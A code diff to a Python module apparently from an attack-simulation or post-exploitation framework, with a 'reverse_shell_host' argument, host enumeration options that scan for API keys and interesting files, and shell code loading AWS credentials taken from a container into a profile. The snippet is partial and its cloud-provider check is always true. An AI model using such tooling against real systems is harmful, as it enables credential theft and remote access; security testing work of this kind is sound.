@@ -13,12 +13,6 @@ from datetime import datetime
 
 
 class Module(BaseModule):
-    """ 
-    Responder module - use TASK environment variable to execute specific workflow 
-    """
-    """
-    Usage: run responder 
-    """
     PLATFORM = [Linux]
     ARGUMENTS = {
         "reverse_shell_host": Argument(
@@ -96,11 +90,11 @@ class Module(BaseModule):
                 session.log("prep_local_env complete")
 
             def enumerate(csp="aws"):
-                extensive = "system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
+                extended = "interesting_files,interesting_perms_files,api_keys_regex"
                 limited = "system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information"
 
                 if csp is "aws" or "azure":
-                    opts = extensive
+                    opts = f"{limited},{extended}"
                 else:
                     # gcp sessions timeout with extensive
                     opts = limited
@@ -204,13 +198,6 @@ configure_container_identity() {
 
             # Use the helper function to configure the 'container' profile
             configure_aws container "$access_key" "$secret_key" "$session_token" "$region"
-
-            # Optional: keep the older logic as a comment for future reference
-            # local temp_role=$(aws sts assume-role-with-web-identity \
-            #     --role-arn $AWS_ROLE_ARN \
-            #     --role-session-name "example-session" \
-            #     --web-identity-token file://$AWS_WEB_IDENTITY_TOKEN_FILE \
-            #     --duration-seconds 3600)
         fi
     fi
 }
